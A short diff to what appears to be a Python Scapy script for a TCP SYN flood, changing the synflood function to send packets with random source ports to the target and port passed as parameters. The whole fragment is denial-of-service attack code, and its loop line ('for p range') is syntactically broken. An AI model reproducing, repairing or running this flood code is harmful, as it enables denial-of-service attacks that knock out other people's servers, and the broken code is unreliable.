@@ -21,7 +21,7 @@ args = parser.parse_args()
 def synflood(target,port):
  for p range (int(args.CONECT)):
    x = random.randint(0,65535)
-   send(IP(dst=args.USER)/TCP(dport=args.PORT,sport=x),verbose=0)
+   send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
 
 
 
